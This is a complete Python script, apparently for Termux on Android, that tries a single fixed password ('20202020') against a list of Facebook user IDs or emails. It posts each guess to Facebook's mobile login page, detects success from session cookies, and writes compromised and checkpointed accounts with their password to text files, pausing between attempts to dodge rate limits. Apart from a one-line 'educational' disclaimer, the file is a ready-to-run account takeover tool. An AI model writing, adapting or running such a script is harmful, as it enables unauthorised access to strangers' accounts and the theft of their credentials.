#!/usr/bin/env python3
# Termux Facebook Account Guesser (for educational/research use only)
# This script attempts to login to Facebook accounts using a list of user IDs/emails and the password '20202020'
# Usage: 
#   1. Save this as facebook_password_guesser.py
#   2. pkg install python
#   3. pip install requests
#   4. python facebook_password_guesser.py userlist.txt

import sys
import requests
import time

def try_login(user_id, password="20202020"):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0",
        "Accept-Language": "en-US,en;q=0.9"
    }
    payload = {
        "email": user_id,
        "pass": password
    }
    session = requests.Session()
    login_url = "https://mbasic.facebook.com/login.php"
    resp = session.post(login_url, data=payload, headers=headers, allow_redirects=False)
    if "c_user" in session.cookies.get_dict():
        return True
    elif "checkpoint" in session.cookies.get_dict():
        return "checkpoint"
    else:
        return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python facebook_password_guesser.py userlist.txt")
        sys.exit(1)
    userlist_file = sys.argv[1]
    try:
        with open(userlist_file, "r") as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading userlist: {e}")
        sys.exit(1)

    print(f"[*] Starting Facebook guesser with {len(users)} users, password='20202020'")
    for user in users:
        print(f"[*] Trying {user}...", end="")
        try:
            result = try_login(user)
            if result == True:
                print(" [SUCCESS] âœ…")
                with open("success.txt", "a") as s:
                    s.write(f"{user}|20202020\n")
            elif result == "checkpoint":
                print(" [CHECKPOINT] âڑ ï¸ڈ")
                with open("checkpoint.txt", "a") as c:
                    c.write(f"{user}|20202020\n")
            else:
                print(" [FAILED]")
        except Exception as e:
            print(f" [ERROR] {e}")
        time.sleep(1)  # To avoid rate limiting

if __name__ == "__main__":
    main()
